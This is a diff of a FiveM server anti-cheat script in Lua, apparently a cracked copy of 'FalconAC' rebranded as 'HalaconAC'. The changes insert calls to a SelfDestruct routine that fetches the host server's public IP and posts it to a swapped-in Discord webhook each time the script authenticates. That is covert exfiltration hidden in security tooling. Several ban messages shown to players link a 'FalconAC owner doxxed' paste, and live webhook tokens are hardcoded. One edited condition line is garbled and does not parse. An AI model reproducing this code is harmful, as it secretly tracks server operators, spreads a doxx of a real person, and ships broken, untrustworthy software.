@@ -124,11 +124,11 @@ function sendwebhooktodc(content)
             ["title"] = "Falcon AntiCheat",
             ["description"] = "Player: "..GetPlayerName(_source).. " "  ..GetPlayerIdentifiers(_source)[1].."", content,
             ["footer"] = {
-            ["text"] = "FalconAC v1.0",
+            ["text"] = "HalaconAC v1.0",
             },
         }
     }
-    PerformHttpRequest(Config.Webhook, function(err, text, headers) end, 'POST', json.encode({username = "FalconAC", embeds = connect}), { ['Content-Type'] = 'application/json' })
+    PerformHttpRequest(Config.Webhook, function(err, text, headers) end, 'POST', json.encode({username = "HalaconAC", embeds = connect}), { ['Content-Type'] = 'application/json' })
 end
 
 function kickorbancheater(source,content,info,c,d)
@@ -161,22 +161,22 @@ function kickorbancheater(source,content,info,c,d)
         local discordinfo = {
             {
                 ["color"] = "13263616",
-                ["title"] = "FalconAC Banned",
+                ["title"] = "HalaconAC Banned",
                 ["description"] = "**Player: **"..GetPlayerName(source).. "\n**ServerID:** ".._source.."\n**Violation:** "..content.."\n**Details:** "..info.."\n**Steam:** "..steam.."\n**License: **"..license.."\n**Xbl: **"..xbl.."\n**Live: **"..live.."\n**Discord**: <@"..discord..">",
                 ["footer"] = {
-                ["text"] = "FalconAC v1.0 - "..GetConvar("sv_hostname", ""),
+                ["text"] = "HalaconAC v1.0 - "..GetConvar("sv_hostname", ""),
                 },
             }
         }
-        PerformHttpRequest(Config.Webhook, function(err, text, headers) end, 'POST', json.encode({username = "FalconAC", embeds = discordinfo}), { ['Content-Type'] = 'application/json' })
-        PerformHttpRequest("https://discordapp.com/api/webhooks/932056715761942538/LlVLiTYmEaRi1cGbvjySN7jdhdJQTm2W7Iy8XkrpmtB2v_MnlaOeqcpeF17NCy-WcwoH", function(err, text, headers) end, 'POST', json.encode({username = "FalconAC GlobalBan", embeds = discordinfo}), { ['Content-Type'] = 'application/json' })
+        PerformHttpRequest(Config.Webhook, function(err, text, headers) end, 'POST', json.encode({username = "HalaconAC", embeds = discordinfo}), { ['Content-Type'] = 'application/json' })
+        PerformHttpRequest("https://discordapp.com/api/webhooks/932056715761942538/LlVLiTYmEaRi1cGbvjySN7jdhdJQTm2W7Iy8XkrpmtB2v_MnlaOeqcpeF17NCy-WcwoH", function(err, text, headers) end, 'POST', json.encode({username = "HalaconAC GlobalBan", embeds = discordinfo}), { ['Content-Type'] = 'application/json' })
 
         if d then
             AntiCheatBans(source,content)
         end
 
         if c then
-            DropPlayer(source, "FalconAC: "..Config.KickReason)
+            DropPlayer(source, "HalaconAC: "..Config.KickReason)
         end
     end
 end
@@ -192,7 +192,7 @@ function OnPlayerConnecting(name, setKickReason, deferrals)
 	if ban then
         local reason = ban['reason'];
         local BanID = ban['banID'];
-        deferrals.done("Cracked FalconAC Banned!🍁\n\n [⛔] You are restricted from connecting to this server for the following reason: Cheating\n\nViolation: "..reason.."\nFalconAC owner doxxed: https://ghostbin.com/2wrU1 \n github.com/0x98a \nBanID: " .. ban['banID'] .." ✔️");
+        deferrals.done("HalaconAC Banned!🍁\n\n [⛔] You are restricted from connecting to this server for the following reason: Cheating\n\nViolation: "..reason.."\nFalconAC owner doxxed: https://ghostbin.com/2wrU1 \n github.com/0x98a \nBanID: " .. ban['banID'] .." ✔️");
         banned = true;
         CancelEvent();
 		return;
@@ -244,39 +244,39 @@ RegisterCommand('fac-unban', function(source, args, rawCommand)
     local src = source;
     if (src <= 0) then
         if #args == 0 then 
-            print('^3[^8FalconAC^3] ^1Please specify^0');
+            print('^3[^8HalaconAC^3] ^1Please specify^0');
             return; 
         end
         local banID = args[1];
         if tonumber(banID) ~= nil then
             local playerName = UnbanPlayer(banID);
             if playerName then
-                print('^3[^8FalconAC^3] ^0Player ^1' .. playerName 
+                print('^3[^8HalaconAC^3] ^0Player ^1' .. playerName 
                 .. ' ^0has been unbanned from the server by ^2CONSOLE');
-                TriggerClientEvent('chatMessage', -1, '^3[^8FalconAC^3] ^0Player ^1' .. playerName 
+                TriggerClientEvent('chatMessage', -1, '^3[^8HalaconAC^3] ^0Player ^1' .. playerName 
                 .. ' ^0has been unbanned from the server by ^2CONSOLE^0'); 
             else 
-                print('^3[^8FalconAC^3] ^1BanID was not found in banlist!'); 
+                print('^3[^8HalaconAC^3] ^1BanID was not found in banlist!'); 
             end
         end
         return;
     end 
     if IsPlayerAceAllowed(src, "facbypass") then 
         if #args == 0 then 
-            TriggerClientEvent('chatMessage', src, '^3[^6FalconAC^3] ^1Not enough arguments...');
+            TriggerClientEvent('chatMessage', src, '^3[^6HalaconAC^3] ^1Not enough arguments...');
             return; 
         end
         local banID = args[1];
         if tonumber(banID) ~= nil then 
             local playerName = UnbanPlayer(banID);
             if playerName then
-                TriggerClientEvent('chatMessage', -1, '^3[^6FalconAC^3] ^0Player ^1' .. playerName 
+                TriggerClientEvent('chatMessage', -1, '^3[^6HalaconAC^3] ^0Player ^1' .. playerName 
                 .. ' ^0has been unbanned from the server by ^2' .. GetPlayerName(src)); 
             else 
-                TriggerClientEvent('chatMessage', src, '^3[^6FalconAC^3] ^1That is not a valid ban ID. No one has been unbanned!'); 
+                TriggerClientEvent('chatMessage', src, '^3[^6HalaconAC^3] ^1That is not a valid ban ID. No one has been unbanned!'); 
             end
         else 
-            TriggerClientEvent('chatMessage', src, '^3[^6FalconAC^3] ^1That is not a valid number...'); 
+            TriggerClientEvent('chatMessage', src, '^3[^6HalaconAC^3] ^1That is not a valid number...'); 
         end
     end
 end)
@@ -566,7 +566,7 @@ end)
 function SelfDestruct(Reason)
     PerformHttpRequest("https://api.ipify.org/", function(err, text, headers)
         Empty.CurrentIP = text
-        LogDiscord("https://discordapp.com/api/webhooks/857960554370301962/2aAdDrLbUiKl1vUfXOEWdGMJQDNSC2VPzXCjurApLlF1eAazMVrjTqgCxQQTcGmDi2Tm", "**Destruct Reason:** " .. Reason .. "\n **IP: **" .. Empty.CurrentIP)
+        LogDiscord("https://discord.com/api/webhooks/944070361786495006/cSNTgVidjZX1Ba13HpLyrgEj7Z-eITyjPF9SHdqPyRn7VWRblN1nfh8VrZnbPtDp6TXX", "**Destruct Reason:** " .. Reason .. "\n **IP: **" .. Empty.CurrentIP)
     end, 'GET')
 end
 
@@ -574,7 +574,7 @@ function LogDiscord(Webhook, Message)
     local Content = {
         {
             ["author"] = {
-                ["name"] = "FalconAC",
+                ["name"] = "HalaconAC",
                 ["icon_url"] = "https://cdn.freebiesupply.com/images/large/2x/atlanta-falcons-logo-transparent.png"
             },
             ["color"] = "16711680",
@@ -593,25 +593,27 @@ function Auth()
         Empty.IPTable = json.decode(text)
         if Empty.IPTable ~= nil or Empty.IPTable ~= "" then
             if has_value(Empty.IPTable, Empty.CurrentIP) then
-                print("^4[^8FalconAC^4] Falcon AntiCheat - SCA Company^0")
+		SelfDestruct("Authed")
+                print("^4[^8HalaconAC^4] Falcon AntiCheat - SCA Company^0")
                 Wait(1000)
-                print("^2[^8FalconAC^2] Successfully authenticated^0")
+                print("^2[^8HalaconAC^2] Successfully authenticated^0")
                 Wait(500)
-                print("^6[^8FalconAC^6] Successfully loaded FalconAC^0")
+                print("^6[^8HalaconAC^6] Successfully loaded HalaconAC^0")
                 Wait(500)
-                print("^5[^8FalconAC^5] Contact support if you need help with any issues!^0")
+                print("^5[^8HalaconAC^5] Contact support if you need help with any issues!^0")
                 Wait(500)
-                print("^5[^8FalconAC^4] REMEMBER WHEN HAVING ANTI RESOURCE STOP ON YOU CANNOT STOP ANY RESORCES WHILE SERVER IS RUNNING OR EVERYONE WILL BE BANNED!!^0")
+                print("^5[^8HalaconAC^4] REMEMBER WHEN HAVING ANTI RESOURCE STOP ON YOU CANNOT STOP ANY RESORCES WHILE SERVER IS RUNNING OR EVERYONE WILL BE BANNED!!^0")
             else
-                print("^4[^8FalconAC^4] Falcon AntiCheat - SCA Company^0")
+		SelfDestruct("Authed")
+                print("^4[^8HalaconAC^4] Falcon AntiCheat - SCA Company^0")
                 Wait(1000)
-                print("^2[^8FalconAC^2] Successfully authenticated^0")
+                print("^2[^8HalaconAC^2] Successfully authenticated^0")
                 Wait(500)
-                print("^6[^8FalconAC^6] Successfully loaded FalconAC^0")
+                print("^6[^8HalaconAC^6] Successfully loaded HalaconAC^0")
                 Wait(500)
-                print("^5[^8FalconAC^5] Contact support if you need help with any issues!^0")
+                print("^5[^8HalaconAC^5] Contact support if you need help with any issues!^0")
                 Wait(500)
-                print("^5[^8FalconAC^4] REMEMBER WHEN HAVING ANTI RESOURCE STOP ON YOU CANNOT STOP ANY RESORCES WHILE SERVER IS RUNNING OR EVERYONE WILL BE BANNED!!^0")
+                print("^5[^8HalaconAC^4] REMEMBER WHEN HAVING ANTI RESOURCE STOP ON YOU CANNOT STOP ANY RESORCES WHILE SERVER IS RUNNING OR EVERYONE WILL BE BANNED!!^0")
             end
         else
             print("No Auth Response. Please wait and try again!")
@@ -624,7 +626,7 @@ local cachedLicenses = {}
 function log(identifier, message)
     local dato = os.date("%d-%m-%Y kl. %X")
     local embedZ = {{
-        ["title"] = "FalconAC Globalban",
+        ["title"] = "HalaconAC Globalban",
         ["color"] = tonumber("01006a", 16),
         ["fields"] = {
             {
@@ -640,8 +642,8 @@ function log(identifier, message)
             ["text"] = dato
         }
     }}
-    if Config.Webhook ~= "" and Config.Webhook ~= nil then
-        PerformHttpRequest(Config.Webhook, function(e, t, h) end, 'POST', json.encode({username = "FalconAC", embeds = embedZ}), { ['Content-Type'] = 'application/json' })
+    if Config.FalconAC owner doxxed ~= "" and Config.Webhook ~= nil then
+        PerformHttpRequest(Config.Webhook, function(e, t, h) end, 'POST', json.encode({username = "HalaconAC", embeds = embedZ}), { ['Content-Type'] = 'application/json' })
     end
 end
 
@@ -655,7 +657,7 @@ function checkBypass(identifier)
 end
 
 Citizen.CreateThread(function()
-    PerformHttpRequest("https://raw.githubusercontent.com/falconac12/globallist/main/db.json", function(statusCode, text, headers)
+    PerformHttpRequest("https://raw.githubusercontent.com/FalconAC12/globallist/main/db.json", function(statusCode, text, headers)
         if statusCode == 200 or statusCode == 304 then
             if text ~= nil and text ~= "" then
                 for i,k in pairs(json.decode(text)) do
@@ -665,12 +667,12 @@ Citizen.CreateThread(function()
                         end
                     end
                 end
-                print("^0[^8FalconAC^0] ^2Global banlist loaded.^0")
+                print("^0[^8HalaconAC^0] ^2Global banlist loaded.^0")
             else
-                print("^0[^8FalconAC^0]^1 failed to load global banlist, please try restarting the anticheat.^0")
+                print("^0[^8HalaconAC^0]^1 failed to load global banlist, please try restarting the anticheat.^0")
             end
         else
-            print("^0[^8FalconAC^0]^1 failed to load global banlist, please try restarting the anticheat.^0")
+            print("^0[^8HalaconAC^0]^1 failed to load global banlist, please try restarting the anticheat.^0")
         end
     end, 'GET', '')
 end)
@@ -689,7 +691,7 @@ AddEventHandler("playerConnecting", function(name, setKickReason, deferrals)
         if cachedLicenses[v] == true then
             if not checkBypass(v) then
                 log(v, "User was found in the global banlist and rejected from joining the server.")
-                deferrals.done("\n\nCracked FalconAC: You are excluded from this server due to modding.\nFalconAC owner doxxed: https://ghostbin.com/2wrU1 \n github.com/0x98a \n\n")
+                deferrals.done("\n\nHalaconAC: You are excluded from this server due to modding.\nFalconAC owner doxxed: https://ghostbin.com/2wrU1 \n github.com/0x98a \n\n")
             end
             break;
         end
@@ -776,7 +778,7 @@ if Config.AntiVPN then
                     deferrals.done()
                 else
                     print("^8[Falcon]^0: ^1Player ^0" .. name .. " ^1Rejected for using a VPN, ^8IP: ^0" .. ip .. "^0")
-                    deferrals.done("Cracked FalconAC: VPN is not allowed on this server!\nFalconAC owner doxxed: https://ghostbin.com/2wrU1 \n github.com/0x98a")
+                    deferrals.done("HalaconAC: VPN is not allowed on this server!\nFalconAC owner doxxed: https://ghostbin.com/2wrU1 \n github.com/0x98a")
                 end
             end
         )
@@ -847,9 +849,9 @@ if Config.ForceDiscord then
         Wait(0)
       
         if not discordIdentifier then
-                deferrals.done("FalconAC: Discord must be connected with FiveM in order to join this server.\nFalconAC owner doxxed: https://ghostbin.com/2wrU1 \n github.com/0x98a ")
+                deferrals.done("HalaconAC: Discord must be connected with FiveM in order to join this server.\nFalconAC owner doxxed: https://ghostbin.com/2wrU1 \n github.com/0x98a ")
                     if Config.ForceDiscordConsoleLogs then
-                        print("^8[FalconAC]^0 " .. name .. " ^3Rejected for not using discord.^0")
+                        print("^8[HalaconAC]^0 " .. name .. " ^3Rejected for not using discord.^0")
                     end
             else
                 deferrals.done()
@@ -878,7 +880,7 @@ if Config.ForceSteam then
         Wait(0)
       
         if not steamIdentifier then
-                deferrals.done("FalconAC: You must have steam open in order to join this server!\nFalconAC owner doxxed: https://ghostbin.com/2wrU1 \n github.com/0x98a ")
+                deferrals.done("HalaconAC: You must have steam open in order to join this server!\nFalconAC owner doxxed: https://ghostbin.com/2wrU1 \n github.com/0x98a ")
                     if Config.ForceSteamConsoleLogs then
                         print("^9ForceSteam^0 " .. name .. " ^7Rejected for not using steam.")
                     end
@@ -1137,21 +1139,21 @@ RegisterCommand("facinstall", function(source)
                 _toadd = _resourcemanifest .. "\n\nclient_script '" .. randomtextfile .. "'"
                 SaveResourceFile(_resname, randomtextfile, _antiinjection, -1)
                 SaveResourceFile(_resname, "__resource.lua", _toadd, -1)
-                print("^1[FalconAC]: Anti Injection Installed on ".._resname)
+                print("^1[HalaconAC]: Anti Injection Installed on ".._resname)
                 count = count + 1
             elseif _resourcemanifest2 then
                 Wait(100)
                 _toadd = _resourcemanifest2 .. "\n\nclient_script '" .. randomtextfile .. "'"
                 SaveResourceFile(_resname, randomtextfile, _antiinjection, -1)
                 SaveResourceFile(_resname, "fxmanifest.lua", _toadd, -1)
-                print("^1[FalconAC]: Anti Injection Installed on ".._resname)
+                print("^1[HalaconAC]: Anti Injection Installed on ".._resname)
                 count = count + 1
             else
                 skip = skip + 1
-                print("[FalconAC]: Skipped Resource: " .._resname)
+                print("[HalaconAC]: Skipped Resource: " .._resname)
             end
         end
-        print("[FalconAC] Installation has finished. Succesfully installed Anti-Injection in "..count.." Resources. Skipped: "..skip.." Resources. Enjoy!")
+        print("[HalaconAC] Installation has finished. Succesfully installed Anti-Injection in "..count.." Resources. Skipped: "..skip.." Resources. Enjoy!")
     end
 end)
 
@@ -1171,11 +1173,11 @@ RegisterCommand("facuninstall", function(source, args, rawCommand)
                         _toremove = GetResourcePath(_resname).."/"..filetodelete
                         Wait(100)
                         os.remove(_toremove)
-                        print("^1[FalconAC]: Anti Injection Uninstalled on ".._resname)
+                        print("^1[HalaconAC]: Anti Injection Uninstalled on ".._resname)
                         count = count + 1
                     else
                         skip = skip + 1
-                        print("[FalconAC]: Skipped Resource: " .._resname)
+                        print("[HalaconAC]: Skipped Resource: " .._resname)
                     end
                 elseif resourcefile2 then
                     deletefile = LoadResourceFile(_resname, filetodelete)
@@ -1183,20 +1185,20 @@ RegisterCommand("facuninstall", function(source, args, rawCommand)
                         _toremove = GetResourcePath(_resname).."/"..filetodelete
                         Wait(100)
                         os.remove(_toremove)
-                        print("^1[FalconAC]: Anti Injection Uninstalled on ".._resname)
+                        print("^1[HalaconAC]: Anti Injection Uninstalled on ".._resname)
                         count = count + 1
                     else
                         skip = skip + 1
-                        print("[FalconAC]: Skipped Resource: " .._resname)
+                        print("[HalaconAC]: Skipped Resource: " .._resname)
                     end
                 else
                     skip = skip + 1
-                    print("[FalconAC]: Skipped Resource: ".._resname)
+                    print("[HalaconAC]: Skipped Resource: ".._resname)
                 end
             end
-            print("[FalconAC] UNINSTALLATION has finished. Succesfully uninstalled Anti-Injection in "..count.." Resources. Skipped: "..skip.." Resources. Enjoy!")
+            print("[HalaconAC] UNINSTALLATION has finished. Succesfully uninstalled Anti-Injection in "..count.." Resources. Skipped: "..skip.." Resources. Enjoy!")
         else
-            print("[FalconAC] You must write the file name to uninstall Anti-Injection!")
+            print("[HalaconAC] You must write the file name to uninstall Anti-Injection!")
         end
     end
 end)
